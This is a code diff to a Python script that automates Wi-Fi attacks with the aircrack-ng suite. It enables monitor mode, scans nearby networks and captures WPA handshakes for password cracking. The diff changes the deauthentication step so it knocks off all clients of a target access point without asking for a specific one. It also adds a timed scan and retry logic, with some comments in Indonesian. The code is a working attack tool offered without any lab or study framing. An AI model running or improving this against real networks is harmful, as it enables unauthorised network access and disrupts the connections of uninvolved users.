@@ -3,6 +3,7 @@
 import os
 import subprocess
 import sys
+import time
 
 
 def run_command(command):
@@ -29,6 +30,7 @@ def detect_monitor_interfaces():
 def enable_monitor_mode(interface):
     """Enable monitor mode on the given interface."""
     print(f"Enabling monitor mode on {interface}...")
+    run_command(f"sudo airmon-ng check kill")
     run_command(f"sudo airmon-ng start {interface}")
     monitor_interface = f"{interface}mon"
     return monitor_interface
@@ -37,10 +39,29 @@ def enable_monitor_mode(interface):
 def scan_networks(monitor_interface):
     """Scan for nearby Wi-Fi networks and display them to the user."""
     print("Scanning for Wi-Fi networks...")
-    stdout, _ = run_command(
-        f"sudo airodump-ng --output-format csv -w scan_result {monitor_interface}"
-    )
     scan_file = "scan_result-01.csv"
+
+    # Hapus file CSV sebelumnya jika ada
+    if os.path.exists(scan_file):
+        os.remove(scan_file)
+
+    # Jalankan airodump-ng selama beberapa detik
+    process = subprocess.Popen(
+        f"sudo airodump-ng --output-format csv -w scan_result {monitor_interface}",
+        shell=True,
+    )
+    print("Scanning... Please wait for 10 seconds.")
+    time.sleep(10)  # Biarkan pemindaian berjalan selama 10 detik
+    process.terminate()
+
+    # Periksa apakah file CSV dihasilkan
+    if not os.path.exists(scan_file):
+        print(
+            "Failed to generate scan results. Please check your wireless interface and monitor mode."
+        )
+        sys.exit(1)
+
+    # Baca file CSV
     with open(scan_file, "r") as f:
         lines = f.readlines()
 
@@ -54,6 +75,12 @@ def scan_networks(monitor_interface):
         essid = parts[13].strip('"')
         if essid:
             networks.append({"BSSID": bssid, "Channel": channel, "ESSID": essid})
+
+    if not networks:
+        print(
+            "No Wi-Fi networks detected. Please ensure monitor mode is enabled and try again."
+        )
+        sys.exit(1)
 
     print("\nAvailable Wi-Fi Networks:")
     for i, network in enumerate(networks):
@@ -85,12 +112,11 @@ def capture_handshake(monitor_interface, target):
     process = subprocess.Popen(command, shell=True)
 
     # Deauthenticate clients
-    client_mac = input(
-        "Enter the MAC address of a connected client (or press Enter to skip): "
+    print("Deauthenticating clients to force reconnection...")
+    deauth_command = (
+        f"sudo aireplay-ng --deauth 10 -a {target['BSSID']} {monitor_interface}"
     )
-    if client_mac:
-        deauth_command = f"sudo aireplay-ng --deauth 10 -a {target['BSSID']} -c {client_mac} {monitor_interface}"
-        run_command(deauth_command)
+    run_command(deauth_command)
 
     # Check for handshake
     print("Waiting for handshake...")
@@ -100,7 +126,7 @@ def capture_handshake(monitor_interface, target):
             process.terminate()
             return f"{output_file}-01.cap"
         else:
-            continue
+            time.sleep(1)
 
 
 def crack_password(capture_file):
